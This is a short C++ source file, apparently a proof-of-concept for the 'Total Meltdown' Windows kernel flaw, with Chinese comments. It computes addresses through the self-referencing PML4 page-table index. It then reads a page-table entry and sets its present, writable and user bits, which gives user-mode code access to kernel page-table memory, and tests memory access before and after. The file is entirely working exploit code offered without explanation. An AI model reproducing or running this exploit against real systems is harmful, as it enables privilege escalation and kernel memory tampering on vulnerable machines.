// totalmeltdown.cpp: 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <stdio.h>
#include <excpt.h>


#define QWORD unsigned long long

#define BASE 0xFFFF000000000000

#define PML4 0xFFFFF6FB7DBED000

#define PML4SELF_IDX 0x1ed

QWORD getAddr(QWORD base,QWORD pml4Idx,QWORD pdptIdx,QWORD pdIdx,QWORD ptIdx,QWORD offsetIdx);


void testAddr(unsigned char *p);

int main(int argc, char *argv)
{
	unsigned char *p = (unsigned char*)getAddr(BASE, PML4SELF_IDX, PML4SELF_IDX, PML4SELF_IDX, 1, 0);//到达PDPT

	testAddr(p);
	
	QWORD *pte = (QWORD *)getAddr(BASE, PML4SELF_IDX, PML4SELF_IDX, PML4SELF_IDX, PML4SELF_IDX, 8);
	printf("%ulld\n", *pte);
	*pte = (*pte | 7);

	testAddr(p);

	return 0;
}


QWORD getAddr(QWORD base, QWORD pml4Idx, QWORD pdptIdx, QWORD pdIdx, QWORD ptIdx, QWORD offsetIdx) {
	return base = base + offsetIdx + (ptIdx<<12) + (pdIdx<<21) + (pdptIdx<<30) + (pml4Idx<<39);
}

void testAddr(unsigned char *p) {
	__try {
		int i = *p;
		printf("access 0x%p sucess\n", p);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		printf("access 0x%p error\n", p);
	}
}
